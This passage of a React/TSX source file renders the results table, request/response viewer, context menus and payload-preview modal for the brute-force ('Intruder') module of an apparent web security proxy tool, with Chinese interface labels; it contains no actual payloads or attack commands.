                          <span className="payload-cell" title={r.payload}>{r.payload}</span>
                          <span style={{ display: "flex", justifyContent: "center" }}>
                            {r.error ? (
                              <span style={{ color: "var(--accent-red)", fontSize: 10, fontWeight: 600 }}>ERR</span>
                            ) : (
                              <StatusCode status={r.status} />
                            )}
                          </span>
                          <span style={{ color: "var(--text-secondary)" }}>
                            {r.error ? "-" : r.length}
                          </span>
                          <span
                            style={{
                              color: (r.duration_ms ?? 0) >= 5000
                                ? "var(--accent-red)"
                                : (r.duration_ms ?? 0) >= 1000
                                ? "var(--accent-orange)"
                                : "var(--text-muted)",
                              fontSize: 10,
                            }}
                          >
                            {r.duration_ms != null
                              ? (r.duration_ms < 1000
                                ? `${Math.round(r.duration_ms)}ms`
                                : `${(r.duration_ms / 1000).toFixed(2)}s`)
                              : "-"}
                          </span>
                          <span style={{ overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", fontSize: 10, color: "var(--text-muted)" }} title={r.mime_type}>
                            {r.mime_type || "-"}
                          </span>
                          <span style={{ overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                            {r.tags ? (
                              r.tags.split(",").map((tag, ti) => {
                                const colors = (r.tag_colors || "").split(",");
                                const colorKey = (colors[ti] || "").toLowerCase();
                                const hex = FLOWTAG_COLORS[colorKey] ?? "#7f7f7f";
                                return (
                                  <span
                                    key={ti}
                                    style={{
                                      display: "inline-block",
                                      padding: "1px 5px",
                                      margin: "0 2px",
                                      borderRadius: 3,
                                      fontSize: 9,
                                      background: hex + "22",
                                      color: hex,
                                      border: `1px solid ${hex}44`,
                                    }}
                                  >
                                    {tag.trim()}
                                  </span>
                                );
                              })
                            ) : (
                              <span style={{ color: "var(--text-muted)" }}>-</span>
                            )}
                          </span>
                        </div>
                      );
                    })}
                  </div>
                    </>
                  )}
                </div>
              }
              second={
                selectedResultLoading ? (
                  <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <Spinner />
                  </div>
                ) : selectedResultFlow ? (
                  <div style={{ display: "flex", flexDirection: "column", height: "100%", overflow: "hidden" }}>
                    <div style={{ padding: "4px 12px", borderBottom: "1px solid var(--border-default)", background: "var(--bg-secondary)", fontSize: 11, color: "var(--text-muted)", flexShrink: 0, display: "flex", alignItems: "center", gap: 8 }}>
                      <span>详情</span>
                      <span style={{ fontFamily: "var(--font-mono)", color: "var(--text-link)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: 300 }} title={selectedResultFlow.url}>{selectedResultFlow.url}</span>
                      {selectedResultFlow.resp_status != null && <StatusCode status={selectedResultFlow.resp_status} />}
                      {selectedResultFlow.duration_ms != null && (
                        <span style={{ fontSize: 10, fontFamily: "var(--font-mono)", color: selectedResultFlow.duration_ms >= 5000 ? "var(--accent-red)" : selectedResultFlow.duration_ms >= 1000 ? "var(--accent-orange)" : "var(--text-muted)" }}>
                          {selectedResultFlow.duration_ms < 1000 ? `${Math.round(selectedResultFlow.duration_ms)}ms` : `${(selectedResultFlow.duration_ms / 1000).toFixed(2)}s`}
                        </span>
                      )}
                    </div>
                    <div style={{ flex: 1, overflow: "hidden", display: "flex" }}>
                      <SplitPane
                        direction="horizontal"
                        initialSplit={0.5}
                        minSize={60}
                        storageKey="intruder_detail_split"
                        first={
                          <div style={{ flex: 1, display: "flex", minHeight: 0, minWidth: 0, flexDirection: "column", overflow: "hidden" }}>
                            <div style={{ padding: "2px 8px", fontSize: 10, color: "var(--text-muted)", background: "var(--bg-tertiary)", borderBottom: "1px solid var(--border-subtle)", flexShrink: 0 }}>Request</div>
                            <div style={{ flex: 1, overflow: "hidden", display: "flex" }}>
                              <CodeEditor value={selectedReqContent} type="request" />
                            </div>
                          </div>
                        }
                        second={
                          <div style={{ flex: 1, display: "flex", minHeight: 0, minWidth: 0, flexDirection: "column", overflow: "hidden" }}>
                            <div style={{ padding: "2px 8px", fontSize: 10, color: "var(--text-muted)", background: "var(--bg-tertiary)", borderBottom: "1px solid var(--border-subtle)", flexShrink: 0 }}>Response</div>
                            <div style={{ flex: 1, overflow: "hidden", display: "flex" }}>
                              <CodeEditor value={selectedRespContent} type="response" />
                            </div>
                          </div>
                        }
                      />
                    </div>
                  </div>
                ) : (
                  <div style={{ flex: 1, display: "flex", flexDirection: "column", width: "100%", height: "100%", minHeight: 0 }}>
                    <EmptyState icon={<Eye />} message="点击结果行查看详情" />
                  </div>
                )
              }
            />
          }
        />
      </div>

      {/* 右键上下文菜单 — 结果列表 */}
      {contextMenu && (
        <div
          ref={menuRef}
          className="context-menu"
          style={{
            position: "fixed",
            top: contextMenu.y,
            left: contextMenu.x,
            zIndex: 1000,
          }}
        >
          <div
            className="context-menu-item"
            onClick={() => {
              if (contextMenu.flowId) {
                handleResultClick(contextMenu.flowId);
              }
              setContextMenu(null);
            }}
          >
            <Eye size={13} />
            查看详情
          </div>
          <div
            className="context-menu-item"
            onClick={() => {
              if (contextMenu.flowId) {
                handleSendResultToRepeater(contextMenu.flowId);
              }
            }}
          >
            <Repeat2 size={13} />
            发送到重放器
          </div>
          <div
            className="context-menu-item"
            onClick={() => {
              if (contextMenu.flowId) {
                handleSendResultToIntruder(contextMenu.flowId);
              }
            }}
          >
            <Swords size={13} />
            发送到爆破器
          </div>
          <div
            className="context-menu-item"
            onClick={() => {
              if (contextMenu.flowId) {
                handleSendResultToAI(contextMenu.flowId);
              }
            }}
          >
            <Bot size={13} />
            发送到 AI 助手
          </div>
        </div>
      )}
      {/* 右键上下文菜单 — 请求编辑器 */}
      {reqContextMenu && (
        <div
          ref={reqMenuRef}
          className="context-menu"
          style={{
            position: "fixed",
            top: reqContextMenu.y,
            left: reqContextMenu.x,
            zIndex: 1000,
          }}
        >
          <div className="context-menu-item" onClick={handleReqSendToRepeater}>
            <Repeat size={13} />
            发送到重放器
          </div>
          <div className="context-menu-item" onClick={handleReqSendToIntruder}>
            <Swords size={13} />
            发送到爆破器
          </div>
          <div className="context-menu-item" onClick={handleReqSendToAI}>
            <Bot size={13} />
            发送到 AI 助手
          </div>
        </div>
      )}

      {/* 预览弹窗 */}
      {previewPayloads !== null && (
        <div
          className="modal-overlay"
          onClick={() => setPreviewPayloads(null)}
        >
          <div
            className="modal-container"
            style={{
              width: 600,
              maxHeight: "70vh",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <div
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 12,
              }}
            >
              <span className="view-title">{previewTitle}</span>
              <button
                className="btn btn-sm"
                onClick={() => setPreviewPayloads(null)}
              >
                关闭
              </button>
            </div>
            <div className="scroll-container">
              {previewPayloads.length === 0 ? (
                <div
                  className="text-xs text-muted"
                  style={{ padding: 12 }}
                >
                  未生成任何 payload
                </div>
              ) : (
                previewPayloads.map((p, i) => (
                  <div
                    key={i}
                    style={{
                      padding: "4px 0",
                      fontFamily: "var(--font-mono)",
                      fontSize: 12,
                      borderBottom: "1px solid var(--border-subtle)",
                      color: "var(--text-primary)",
                      wordBreak: "break-all",
                    }}
                  >
                    {p}
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
